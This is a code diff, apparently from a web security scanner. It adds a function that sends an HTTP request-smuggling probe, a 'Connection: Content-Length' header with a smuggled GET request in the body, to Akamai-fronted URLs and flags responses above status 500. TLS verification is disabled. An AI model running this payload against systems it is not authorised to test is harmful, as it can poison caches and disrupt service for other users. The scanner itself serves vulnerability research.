@@ -42,6 +42,28 @@ def akamai(url, s):
         except:
             pass
     cpdos_akamai(url, s)
+    
+
+def req_smuggling(url, s):
+    #https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b
+    #https://blog.hacktivesecurity.com/index.php/2022/09/17/http/
+    headers = {
+        "Connection": "Content-Length",
+        }
+
+    body = (
+        "   \r\n\r\n"
+        "   GET / HTTP/1.1\r\n"
+        "   Host: www.example.com\r\n"
+        "   X-Foo: x\r\n"
+    )
+
+    #print(body)
+    res_main = s.get(url, verify=False, timeout=10)
+    response = s.get(url, headers=headers, data=body, verify=False, timeout=10)
+
+    if response.status_code > 500 and response.status_code != res_main.status_code:
+        print(f'   └── {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}')
 
 
 def cpdos_akamai(url, s):
